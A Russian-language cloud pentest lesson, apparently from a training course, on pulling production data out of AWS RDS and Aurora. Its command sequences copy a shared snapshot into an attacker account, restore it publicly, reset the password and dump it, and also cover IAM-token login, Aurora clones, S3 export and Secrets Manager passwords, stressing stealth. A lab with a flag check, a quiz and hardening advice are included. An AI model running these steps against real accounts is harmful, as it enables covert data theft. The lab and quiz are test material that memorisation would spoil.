---
id: cloud-rds-aurora
title: "RDS и Aurora: публичный доступ, снапшоты и IAM-аутентификация"
category: cloud
parent: cloud-aws-data-deep
difficulty: hard
order: 3
tags: [cloud, aws, rds, aurora, snapshot, iam-auth, database, privesc]
prerequisites: [cloud-aws-data-deep, cloud-storage-s3]
useful_for:
  - "Пентест управляемых баз AWS"
  - "Извлечение данных из снапшотов"
  - "Использование IAM-аутентификации в БД"
estimated_minutes: 55
summary: "RDS/Aurora: публичная доступность, снапшоты как канал утечки, IAM database authentication и чтение мастер-паролей из Secrets Manager/SSM."
lab:
  kind: shell
  title: "Практика: публичный снапшот RDS и дамп БД"
  toolset: [core]
  workdir: /home/student/rds
  files: [task.md, notes.md, describe-db-snapshots.json, snapshot-attribute.json, rds-dump.sql]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Найди SnapshotId в `describe-db-snapshots.json`."
    - "Проверь права: в `snapshot-attribute.json` стоит `\"AttributeValues\": [\"all\"]` — снапшот расшарен всем."
    - "Восстанови/дамп БД (`rds-dump.sql`) и найди флаг: `grep nto rds-dump.sql > found.txt`."

---

## Задача

**RDS** и **Aurora** — управляемые базы данных AWS. В отличие от DynamoDB, у них есть обычный сетевой порт (`3306`/`5432`), и их часто считают недоступными: «в базу из интернета не попасть». На практике есть минимум пять способов добраться до данных, и **самый быстрый не требует стучаться в порт**.

Цель урока: имея облачную роль, получить полный дамп прод-базы, не тронув прод-инстанс.

## Данные, с которыми работаем

RDS — управляемый сервис: ОС ты не видишь, но управляешь сетью, снапшотами и аутентификацией через API. Ключевые объекты:

- **DB instance / cluster** — вычислительный узел с endpoint;
- **Snapshot** — побайтовая копия базы, которую можно **шарить** и восстанавливать;
- **IAM database authentication** — вход в БД токеном вместо пароля.

Наш вектор — **снапшот**. Начинаем с инвентаризации:

```bash
$ aws rds describe-db-instances \
    --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Public:PubliclyAccessible}' --output table
-----------------------------
|  ID      | Engine | Public |
| prod-db  | mysql  | False  |
-----------------------------
$ aws rds describe-db-snapshots --snapshot-type shared \
    --query 'DBSnapshots[].{ID:DBSnapshotIdentifier,Enc:Encrypted}' --output table
---------------------------------
|  ID            | Enc          |
| prod-db-snap   | False        |
---------------------------------
```

Инстанс `prod-db` приватный (в интернет не смотрит). Но есть снапшот `prod-db-snap`, **расшаренный** на наш аккаунт и **незашифрованный**. Это и есть вход.

## Шаг 1: копируем снапшот к себе

Снапшот `shared` — значит, его владелец дал нашему аккаунту доступ. Копируем его в свой аккаунт:

```bash
$ aws rds copy-db-snapshot \
    --source-db-snapshot-identifier arn:aws:rds:us-east-1:111122223333:snapshot:prod-db-snap \
    --target-db-snapshot-identifier stolen-snap --region us-east-1
{"DBSnapshot": {"DBSnapshotIdentifier": "stolen-snap", "Status": "creating"}}
```

## Шаг 2: восстанавливаем инстанс под своим контролем

Копия — это ещё не база. Восстанавливаем из неё **свой** инстанс, помечая его публично доступным:

```bash
$ aws rds wait db-snapshot-completed --db-snapshot-identifier stolen-snap
$ aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier stolen-db \
    --db-snapshot-identifier stolen-snap \
    --db-instance-class db.t3.medium --publicly-accessible
{"DBInstance": {"DBInstanceStatus": "creating",
                "Endpoint": {"Address": "stolen-db.abc123.us-east-1.rds.amazonaws.com"}}}
```

## Шаг 3: меняем пароль и подключаемся

Мы владелец нового инстанса, поэтому можем сменить мастер-пароль. Затем открываем порт своему IP:

```bash
$ aws rds modify-db-instance --db-instance-identifier stolen-db \
    --master-user-password 'Pwn3d!Passw0rd' --apply-immediately
$ aws ec2 authorize-security-group-ingress --group-id sg-0abc \
    --protocol tcp --port 3306 --cidr 203.0.113.10/32
```

И дампим:

```bash
$ mysqldump -h stolen-db.abc123.us-east-1.rds.amazonaws.com -u admin -p'Pwn3d!Passw0rd' \
    --all-databases > dump.sql
$ grep -c 'INSERT' dump.sql
4218
```

Полная копия прод-базы у нас, и при этом мы **ни разу не коснулись прод-инстанса** — в его логах нет наших подключений.

## Полный прогон от начала до конца

1. `describe-db-instances` → прод приватный.
2. `describe-db-snapshots --snapshot-type shared` → расшаренный незашифрованный снапшот.
3. `copy-db-snapshot` → копия в нашем аккаунте.
4. `restore-db-instance-from-db-snapshot` → свой публичный инстанс.
5. Сменили пароль, открыли SG, `mysqldump` → полный дамп.

## Если снапшот зашифрован: IAM-аутентификация

Зашифрованный снапшот нельзя скопировать без прав на **KMS-ключ** (KMS — сервис управления ключами AWS). Если шифрование мешает, есть другой путь: **IAM database authentication**. Тогда пароль вообще не нужен — клиент генерирует подписанный **SigV4-токен** (подпись запроса ключом AWS) и использует его как пароль. Токен живёт 15 минут.

Проверяем, включена ли она и разрешена ли нам:

```bash
$ aws rds describe-db-instances --db-instance-identifier prod-db \
    --query 'DBInstances[0].IAMDatabaseAuthenticationEnabled'
true
$ aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::111122223333:role/app \
    --action-names rds-db:connect \
    --resource-arns arn:aws:rds-db:us-east-1:111122223333:dbuser:db-ABC123/prod_user \
    --query 'EvaluationResults[0].EvalDecision'
"allowed"
```

Тогда подключаемся PostgreSQL без пароля:

```bash
$ TOKEN=$(aws rds generate-db-auth-token --hostname prod-db.abc.rds.amazonaws.com \
    --port 5432 --username prod_user --region us-east-1)
$ PGPASSWORD="$TOKEN" psql "host=prod-db.abc.rds.amazonaws.com port=5432 dbname=app user=prod_user sslmode=require"
app=>
```

Одна `rds-db:connect` без утечки пароля = вход в прод.

## Если не сработало: другие пути к данным

- **Мастер-пароль в Secrets Manager.** RDS часто хранит его как секрет `rds!db-*`. `secretsmanager:GetSecretValue` отдаёт его напрямую.
- **Экспорт в S3.** `start-export-task` выгружает снапшот в S3 в формате Parquet — читай через Athena, не поднимая инстанс.
- **Публичный инстанс.** Ищи `PubliclyAccessible: true` с открытой security group.
- **Aurora-клон.** `restore-db-cluster-to-point-in-time --restore-type copy-on-write` создаёт быстрый клон, разделяющий storage с источником.
- **Логи.** `describe-db-log-files` + `download-db-log-file-portion` иногда содержат логины из ошибок.

## Частые ошибки и подводные камни

- **Подбирать пароль к публичному RDS.** Это долго и шумно; снапшот или IAM-аутентификация быстрее.
- **Забыть, что `ModifyDBInstance` перезагружает инстанс.** Это простой в проде — согласуйте такие операции.
- **Считать, что «нет публичного инстанса» = «нет данных».** Снапшоты и S3-экспорты часто забыты.
- **Не проверить регион.** Снапшоты и инстансы живут в конкретном регионе и не видны из другого.
- **Игнорировать `DeletionProtection`.** Эксперименты на защищённом инстансе просто упадут с ошибкой.

- **Забывать про Aurora-специфику.** Кластерный клон copy-on-write и reader endpoint дают дополнительные пути, которых нет у обычного RDS.

- **Не читать логи движка.** `download-db-log-file-portion` иногда раскрывает логины из ошибок подключения.

## Что мы теперь знаем

- Самый быстрый путь к данным RDS — **расшаренный/публичный снапшот**, а не подбор пароля.
- Незашифрованный снапшот копируется в свой аккаунт и восстанавливается подконтрольным инстансом.
- Зашифрованный снапшот требует прав на KMS-ключ.
- IAM database authentication даёт вход без пароля по короткоживущему токену (`rds-db:connect`).
- Мастер-пароль часто лежит в Secrets Manager (`rds!db-*`).
- `start-export-task` выгружает данные в S3 в обход инстанса.

## На что смотреть дальше

- **aws-devops**: CodeBuild/CodePipeline как RCE и источник кредов к базам.
- **rds/Secrets Manager** → **cloud-privesc-iam**: что делать с найденными паролями и ключами.
- **database-exposure**: открытые управляемые БД вне AWS (Cosmos DB, Cloud SQL).

## Шаг 4: Aurora clone — клон без копирования данных

Если снапшота нет, но есть Aurora-кластер, есть более быстрый путь — **clone**. Клон разделяет
storage с источником (copy-on-write): копирование данных не занимает часы, клон виден почти сразу.
Нужны права `rds:RestoreDBClusterToPointInTime` и доступ к KMS-ключу, если кластер зашифрован:

```bash
$ aws rds restore-db-cluster-to-point-in-time \
    --db-cluster-identifier prod-clone \
    --source-db-cluster-identifier prod-cluster \
    --restore-type copy-on-write --use-latest-restorable-time
{"DBCluster": {"DBClusterIdentifier": "prod-clone", "Status": "creating"}}
```

Затем добавляем инстанс-читатель к клону:

```bash
$ aws rds create-db-instance --db-instance-identifier prod-clone-writer \
    --db-cluster-identifier prod-clone --engine aurora-mysql \
    --db-instance-class db.t3.medium --publicly-accessible
```

Клон отделён от прод-кластера: изменения в нём не влияют на источник, но данные — те же на
момент клонирования. Меняем мастер-пароль (как в шаге 3) и дампим.

## Таблица: пять путей к данным RDS

| Путь | Нужные права | Шум для прода | Когда применять |
|---|---|---|---|
| Расшаренный снапшот → copy → restore | `rds:CopyDBSnapshot`, `rds:RestoreDBInstanceFromDBSnapshot` | нет (прод не тронут) | снапшот shared и не зашифрован |
| IAM database auth | `rds-db:connect` + SigV4-токен | нет (обычный вход в БД) | IAM-auth включена |
| Aurora clone | `rds:RestoreDBClusterToPointInTime` | минимальный | есть Aurora-кластер |
| Экспорт снапшота в S3 | `rds:StartExportTask` + `s3:PutObject` | нет | нужен Parquet / Athena |
| Мастер-пароль из Secrets Manager | `secretsmanager:GetSecretValue` | нет | секрет `rds!db-*` доступен |

Выбирай путь по **правам**, а не по привычке: самый быстрый почти никогда не «стучаться в порт».

## Защита: как закрыть эти каналы

- **Шифровать снапшоты** ключом KMS, к которому нет доступа у недоверенных ролей — тогда `copy-db-snapshot` провалится.
- **Не расшаривать снапшоты** на внешние аккаунты (`describe-db-snapshots --snapshot-type shared` должен быть пустым).
- **Ограничить `rds:Restore*`** — восстановление под своим контролем и есть основной вектор.
- **Не хранить мастер-пароль в открытом Secrets Manager** с широким `GetSecretValue`.
- **IAM database auth — только с узкой `rds-db:connect`** по конкретному `dbuser:...`.
- **Включить `DeletionProtection`** и аудит CloudTrail на `CopyDBSnapshot` / `Restore*`.

## Справочник: пути к данным RDS/Aurora

У «облачной базы» много дверей, и не все они — пароль. Полезно держать карту путей и их требований:

| Путь | Что нужно | Даёт | Заметность |
|---|---|---|---|
| Расшаренный снапшот | `rds:CopyDBSnapshot` | копия данных без пароля | средняя |
| Публичный инстанс | SG с `0.0.0.0/0` | прямое подключение | низкая |
| IAM-аутентификация | `rds-db:connect` | вход по SigV4-токену | низкая |
| Мастер-пароль в Secrets Manager | `secretsmanager:GetSecretValue` | обычный логин | низкая |
| Экспорт в S3 | `rds:StartExportTask` | Parquet-выгрузка | средняя |
| Aurora copy-on-write клон | `rds:RestoreDBClusterToPointInTime` | быстрый клон | средняя |
| Логи движка | `rds:DownloadDBLogFilePortion` | утечки из ошибок | низкая |

Логика приоритета: сначала ищи снапшоты и S3-экспорты (часто забытые), затем IAM/секреты, и лишь в последнюю очередь думай о подборе пароля — это медленно, шумно и обычно не нужно.

## Ограничения и риски

- **Регион — граница видимости.** Снапшот и инстанс в разных регионах не видят друг друга; всегда указывай `--region`.
- **KMS закрывает зашифрованные снапшоты.** Без прав на ключ скопировать снапшот нельзя — переключайся на IAM-аутентификацию или Secrets Manager.
- **Мутирующие операции бьют по проду.** `ModifyDBInstance` перезагружает инстанс, `restore` создаёт новые ресурсы и счета; на боевой среде такие шаги согласуют.
- **`DeletionProtection` и `--no-multi-az`** могут просто отклонить эксперимент — читай текст ошибки, а не повторяй вслепую.
- **Логи и метрики — тоже данные.** Даже если дамп не удался, `describe-events` и логи подключений нередко раскрывают имена пользователей и вспомогательную информацию для следующего шага.

## Квиз

Проверь себя.

```quiz
- question: "Какой вызов чаще всего позволяет получить данные RDS без доступа к порту?"
  options:
    - "RestoreDBInstanceFromDBSnapshot / CopyDBSnapshot расшаренного снапшота"
    - "ModifyDBInstance"
    - "RebootDBInstance"
    - "DescribeDBLogFiles"
  answer: 0
  explanation: "Снапшот копируется в свой аккаунт и восстанавливается подконтрольным инстансом."
- question: "Что мешает скопировать зашифрованный снапшот в чужой аккаунт?"
  options:
    - "Нужны права на KMS-ключ, которым он зашифрован"
    - "Он удаляется через час"
    - "Он доступен только на чтение"
    - "Его нельзя восстановить"
  answer: 0
  explanation: "KMS-ключ не шарится автоматически вместе со снапшотом."
- question: "Зачем атакующему rds-db:connect?"
  options:
    - "Позволяет войти в БД с IAM-токеном вместо пароля"
    - "Даёт доступ к CloudTrail"
    - "Удаляет снапшоты"
    - "Меняет регион"
  answer: 0
  explanation: "IAM database authentication принимает короткоживущий токен от generate-db-auth-token."
- question: "Куда можно выгрузить снапшот для чтения без восстановления инстанса?"
  options:
    - "В S3 через start-export-task и читать через Athena"
    - "В DynamoDB"
    - "В Route 53"
    - "В CloudFront"
  answer: 0
  explanation: "Экспорт снапшота в S3 в формате Parquet даёт прямой доступ к данным."
- question: "Почему восстановление снапшота в своём аккаунте незаметно для прод-инстанса?"
  options:
    - "Мы работаем с копией, не касаясь прод-инстанса и его логов"
    - "Потому что снапшот не логируется вообще"
    - "Потому что RDS не ведёт логи"
    - "Потому что копирование шифруется"
  answer: 0
  explanation: "Копия живёт в нашем аккаунте; подключения идут к восстановленному инстансу."
```

## Куда дальше

В следующем уроке мы разберём **AWS DevOps** — CodeBuild, CodePipeline и CodeDeploy — и посмотрим, как из сборки получить RCE и креды. А пока главное запомни: **у RDS-базы данных несколько входов**, и самый тихий из них — снапшот, который копируется и восстанавливается без единого касания прода.

## Где пригодится

- **Пентест AWS:** получение данных и кредов из управляемых БД.
- **Red team:** тихая эксфильтрация через снапшоты.
- **Cloud IR:** анализ экспортированных снапшотов.
- **Сертификация:** AWS Security — Specialty.
